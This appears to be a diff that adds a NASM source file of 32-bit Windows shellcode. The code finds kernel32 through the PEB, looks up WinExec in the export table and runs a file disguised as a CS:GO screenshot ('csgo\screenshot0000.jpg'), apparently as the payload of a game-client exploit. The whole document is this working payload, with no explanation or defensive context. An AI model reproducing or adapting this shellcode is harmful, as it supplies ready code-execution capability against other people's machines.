@@ -1,0 +1,48 @@
+; nasm -f win32 shellcode.asm -o shellcode.obj
+SECTION .TEXT
+	global _start
+
+_start:
+	; store relocation info in ecx
+	call dummy_label
+
+dummy_label:
+	pop ecx
+	sub ecx, dummy_label
+
+	; resolve kernel32 export table
+	xor edx, edx
+	mov esi, dword [fs:edx + 0x30]
+	mov esi, dword [esi + 0xc]
+	mov esi, dword [esi + 0xc]
+	lodsd
+	mov esi, dword [eax]
+	mov edi, dword [esi + 0x18]
+	mov ebx, dword [edi + 0x3c]
+	mov ebx, dword [edi + ebx + 0x78]
+	mov esi, dword [edi + ebx + 0x20]
+	add esi, edi
+	mov edx, dword [edi + ebx + 0x24]
+
+	; resolve WinExec address
+label:
+	movzx ebp, word [edi + edx]
+	inc edx
+	inc edx
+	lodsd
+	cmp dword [edi + eax], 0x456e6957
+	jne label
+	mov esi, dword [edi + ebx + 0x1c]
+	add esi, edi
+	add edi, dword [esi + ebp * 4]
+
+	; build pointer to screenshot
+	lea esi, [exec_path]
+	add esi, ecx
+
+	; :--)
+	push 0
+	push esi
+	call edi
+
+exec_path: db "csgo\screenshot0000.jpg", 0
